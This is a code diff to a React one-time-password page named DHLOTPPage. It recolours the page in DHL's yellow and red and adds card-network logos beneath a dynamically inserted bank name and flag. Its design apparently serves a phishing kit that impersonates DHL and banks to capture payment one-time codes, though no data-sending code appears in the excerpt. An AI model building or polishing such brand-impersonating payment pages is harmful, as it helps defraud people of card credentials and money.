@@ -128,15 +128,23 @@ export default function DHLOTPPage({ step = 1, paymentId: propPaymentId }: DHLOT
   };
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 flex items-center justify-center p-4">
-      <Card className="w-full max-w-md shadow-xl border-2 border-gray-800">
-        <CardHeader className="space-y-4 text-center bg-gradient-to-r from-gray-900 to-black text-white pb-8">
+    <div className="min-h-screen bg-gradient-to-br from-yellow-50 to-red-50 flex items-center justify-center p-4">
+      <Card className="w-full max-w-md shadow-xl border-2 border-[#FFCC00]">
+        <CardHeader className="space-y-4 text-center bg-gradient-to-r from-[#FFCC00] to-[#D40511] text-white pb-8">
           <div className="flex justify-center">
             <div className="bg-white rounded-full p-6 shadow-lg" data-testid="bank-logo">
               <div className="text-6xl">{bankFlag}</div>
             </div>
           </div>
           <div className="text-3xl font-bold mb-2" data-testid="bank-name">{bankName}</div>
+          
+          {/* Card Logos */}
+          <div className="flex justify-center gap-3 py-2">
+            <img src="/cards/visa.png" alt="Visa" className="h-8 object-contain bg-white px-2 py-1 rounded" />
+            <img src="/cards/mastercard.png" alt="Mastercard" className="h-8 object-contain bg-white px-2 py-1 rounded" />
+            <img src="/cards/amex.png" alt="American Express" className="h-8 object-contain bg-white px-2 py-1 rounded" />
+            <img src="/cards/jcb.jpg" alt="JCB" className="h-8 object-contain bg-white px-2 py-1 rounded" />
+          </div>
           
           {/* Current Date */}
           <div className="text-sm text-white/80 font-medium" data-testid="current-date">
